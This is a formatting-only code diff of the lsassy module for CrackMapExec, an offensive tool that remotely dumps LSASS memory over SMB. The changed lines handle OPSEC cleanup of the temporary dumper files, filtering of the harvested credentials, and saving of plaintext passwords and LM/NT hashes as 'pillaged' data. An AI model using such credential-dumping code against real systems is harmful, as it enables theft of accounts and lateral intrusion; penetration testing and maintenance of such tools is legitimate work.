@@ -18,9 +18,7 @@ class CMEModule:
     name = "lsassy"
     description = "Dump lsass and parse the result remotely with lsassy"
     supported_protocols = ["smb"]
-    opsec_safe = (
-        True  # writes temporary files, and it's possible for them to not be deleted
-    )
+    opsec_safe = True  # writes temporary files, and it's possible for them to not be deleted
     multiple_hosts = True
 
     def __init__(self, context=None, module_options=None):
@@ -85,13 +83,9 @@ class CMEModule:
             if deleted_file:
                 context.log.debug(f"Deleted dumper file")
             else:
-                context.log.fail(
-                    f"[OPSEC] No exception, but failed to delete file: {file_path}"
-                )
+                context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
         except Exception as e:
-            context.log.fail(
-                f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}"
-            )
+            context.log.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")
 
         if credentials is None:
             credentials = []
@@ -100,13 +94,7 @@ class CMEModule:
             c = cred.get_object()
             context.log.debug(f"Cred: {c}")
 
-        credentials = [
-            cred.get_object()
-            for cred in credentials
-            if cred.ticket is None
-            and cred.masterkey is None
-            and not cred.get_username().endswith("$")
-        ]
+        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
         credentials_unique = []
         credentials_output = []
         context.log.debug(f"Credentials: {credentials}")
@@ -141,10 +129,7 @@ class CMEModule:
         domain = None
         for cred in credentials:
             domain = cred["domain"]
-            if (
-                "." not in cred["domain"]
-                and cred["domain"].upper() in connection.domain.upper()
-            ):
+            if "." not in cred["domain"] and cred["domain"].upper() in connection.domain.upper():
                 domain = connection.domain  # slim shady
             self.save_credentials(
                 context,
@@ -163,9 +148,7 @@ class CMEModule:
                 cred["lmhash"],
                 cred["nthash"],
             )
-            credz_bh.append(
-                {"username": cred["username"].upper(), "domain": domain.upper()}
-            )
+            credz_bh.append({"username": cred["username"].upper(), "domain": domain.upper()})
             add_user_bh(credz_bh, domain, context.log, connection.config)
 
     @staticmethod
@@ -176,15 +159,11 @@ class CMEModule:
         context.log.highlight(output)
 
     @staticmethod
-    def save_credentials(
-        context, connection, domain, username, password, lmhash, nthash
-    ):
+    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
         host_id = context.db.get_hosts(connection.host)[0][0]
         if password is not None:
             credential_type = "plaintext"
         else:
             credential_type = "hash"
             password = ":".join(h for h in [lmhash, nthash] if h is not None)
-        context.db.add_credential(
-            credential_type, domain, username, password, pillaged_from=host_id
-        )
+        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
